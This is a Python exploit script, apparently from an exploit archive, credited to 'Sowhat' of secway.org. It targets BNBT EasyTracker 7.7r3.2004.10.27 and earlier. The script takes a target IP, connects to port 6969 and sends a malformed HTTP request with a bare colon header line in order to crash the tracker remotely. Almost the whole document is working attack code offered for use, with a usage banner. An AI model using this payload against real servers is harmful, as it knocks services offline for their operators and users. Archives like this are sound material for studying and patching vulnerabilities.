//BNBTDOS.py
# BNBT EasyTracker Remote D.O.S Exploit
# Bug discoverd and coded by Sowhat
# http://secway.org

# Version 7.7r3.2004.10.27 and below
# the BNBT project: http://bnbteasytracker.sourceforge.net/

import sys
import string
import socket

if (len(sys.argv) != 2):
print "\nUsage: " + sys.argv[0] + " TargetIP\n"
print "##################################################################"
print "# #"
print "# BNBT EasyTracker Remote D.O.S Exploit #"
print "# Bug discoverd and coded by Sowhat #"
print "# http://secway.org #"
print "##################################################################"
sys.exit(0)

host = sys.argv[1]
port = 6969


payload = "GET /index.htm HTTP/1.1\r\n:\r\n\r\n"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
s.send(payload)
